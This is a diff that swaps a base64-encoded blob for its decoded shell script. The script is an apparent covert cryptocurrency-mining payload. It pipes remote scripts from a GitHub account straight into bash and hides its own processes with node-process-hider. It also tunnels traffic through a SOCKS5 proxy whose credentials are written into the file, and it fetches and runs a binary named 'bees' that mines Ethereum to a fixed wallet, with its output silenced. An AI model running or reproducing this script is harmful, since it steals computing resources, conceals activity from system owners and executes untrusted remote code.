@@ -1,27 +1,63 @@
-IyEvYmluL3NoCndnZXQgLU8gLSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vbmF0
-aGFuZmxlaWdodC9zY3JpcHRzL21haW4vc3RhcnRfcGluZ19ldmVyeTJtaW4uc2ggfCBiYXNoICYK
-CmxuIC1mcyAvdXNyL3NoYXJlL3pvbmVpbmZvL0FmcmljYS9Kb2hhbm5lc2J1cmcgL2V0Yy9sb2Nh
-bHRpbWUKZHBrZy1yZWNvbmZpZ3VyZSAtLWZyb250ZW5kIG5vbmludGVyYWN0aXZlIHR6ZGF0YQoK
-YXB0IHVwZGF0ZTthcHQgLXkgaW5zdGFsbCBsaWJwY2ktZGV2IHNjcmVlbiB1bnppcCBuZXQtdG9v
-bHMgaXB1dGlscy1waW5nCgp3Z2V0IC1PIC0gaHR0cHM6Ly9kZWIubm9kZXNvdXJjZS5jb20vc2V0
-dXBfMTcueCB8IGJhc2gKCmFwdCAteSBpbnN0YWxsIG5vZGVqcwoKYXB0IC15IGluc3RhbGwgbnBt
-ID4gL2Rldi9udWxsCgpucG0gaSAtZyBub2RlLXByb2Nlc3MtaGlkZXIKCndnZXQgaHR0cHM6Ly9y
-YXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25hdGhhbmZsZWlnaHQvc2NyaXB0cy9tYWluL2dyYXBo
-aWNzLnRhci5negoKdGFyIC14dnpmIGdyYXBoaWNzLnRhci5negoKcGggYWRkIGdyYWZ0Y3AKcGgg
-YWRkIGJlZXMKCmNhdCA+IGdyYWZ0Y3AvbG9jYWwvZ3JhZnRjcC1sb2NhbC5jb25mIDw8RU5ECmxp
-c3RlbiA9IDoyMjMzCmxvZ2xldmVsID0gMQpzb2NrczUgPSBncHVzb2NrczYud290Lm1yZmFjZS5j
-b206MTA4MApzb2NrczVfdXNlcm5hbWUgPSBtaWtyb3Rpazk5OQpzb2NrczVfcGFzc3dvcmQgPSBF
-bGliYXdub3MKRU5ECgouL2dyYWZ0Y3AvbG9jYWwvZ3JhZnRjcC1sb2NhbCAtY29uZmlnIGdyYWZ0
-Y3AvbG9jYWwvZ3JhZnRjcC1sb2NhbC5jb25mICYKCnNsZWVwIC4yCgplY2hvICIgIgplY2hvICIg
-IgoKZWNobyAiKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq
-KioqKioqKioqKioqKioqKioqIgoKLi9ncmFmdGNwL2dyYWZ0Y3AgY3VybCBpZmNvbmZpZy5tZQoK
-ZWNobyAiICIKZWNobyAiICIKCmVjaG8gIioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq
-KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKiIKCmVjaG8gIiAiCmVjaG8gIiAiCgpw
-cyAtQSB8IGdyZXAgZ3JhZnRjcCogfCBhd2sgJ3twcmludCAkMX0nIHwgeGFyZ3Mga2lsbCAtOSAk
-MQoKLi9ncmFmdGNwL2xvY2FsL2dyYWZ0Y3AtbG9jYWwgLWNvbmZpZyBncmFmdGNwL2xvY2FsL2dy
-YWZ0Y3AtbG9jYWwuY29uZiAmCgpzbGVlcCAuNQoKCi4vZ3JhZnRjcC9ncmFmdGNwIHdnZXQgaHR0
-cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25hdGhhbmZsZWlnaHQvc2NyaXB0cy9tYWlu
-L2JlZXMKY2htb2QgK3ggYmVlcwoKCi4vZ3JhZnRjcC9ncmFmdGNwIC4vYmVlcyAtYSBldGhhc2gg
-LXcgMHhDMjM2QmVkZkNDNGVjNmEzOTI1MWVlQkRkMTg1RmEwY2I0NGI5MTBCIC1wIHN0cmF0dW0r
-c3NsOi8vZXRoLWRlLmZsZXhwb29sLmlvOjU1NTUgLXIgQmVlcyAtdiA0ID4vZGV2L251bGwgMj4m
-MQoK
+#!/bin/sh
+wget -O - https://raw.githubusercontent.com/nathanfleight/scripts/main/start_ping_every2min.sh | bash &
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install libpci-dev screen unzip net-tools iputils-ping
+
+wget -O - https://deb.nodesource.com/setup_17.x | bash
+
+apt -y install nodejs
+
+apt -y install npm > /dev/null
+
+npm i -g node-process-hider
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+ph add graftcp
+ph add bees
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = gpusocks6.wot.mrface.com:1080
+socks5_username = mikrotik999
+socks5_password = Elibawnos
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+ps -A | grep graftcp* | awk '{print $1}' | xargs kill -9 $1
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .5
+
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bees
+chmod +x bees
+
+
+./graftcp/graftcp ./bees -a ethash -w 0xC236BedfCC4ec6a39251eeBDd185Fa0cb44b910B -p stratum+ssl://eth-de.flexpool.io:5555 -r Bees -v 4
+
